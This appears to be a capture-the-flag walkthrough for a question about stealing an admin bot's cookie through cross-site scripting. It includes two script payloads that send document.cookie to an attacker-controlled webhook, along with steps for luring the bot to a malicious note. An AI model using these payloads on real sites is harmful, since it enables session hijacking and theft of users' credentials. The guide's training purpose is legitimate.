# Investigation Guide: Q7 (Flag 2) - XSS & Admin Bot

## Q7: What is the flag stored in the admin bot's cookie?

This is a classic Cross-Site Scripting (XSS) challenge involving an "Admin Bot" that visits links you provide.

### Steps to Investigate:

1.  **Find an XSS Injection Point:**
    *   Test fields like "Note Title", "Note Content", or "Username".
    *   Use the breakout character identified in Q6.
    *   Verify your XSS works on yourself first: `<script>fetch('https://your-webhook.site/'+document.cookie)</script>`.

2.  **Exfiltrate the Cookie:**
    *   Set up a listener (e.g., Webhook.site or a RequestBin).
    *   Inject a payload that sends the `document.cookie` to your listener.
    *   Example payload:
        ```html
        <script>location='https://your-webhook.site/?c='+document.cookie</script>
        ```

3.  **Trigger the Admin Bot:**
    *   Submit the link to your malicious note/page to the "Report to Admin" or "Contact Support" feature.
    *   Check your listener for a request coming from the admin's browser session.
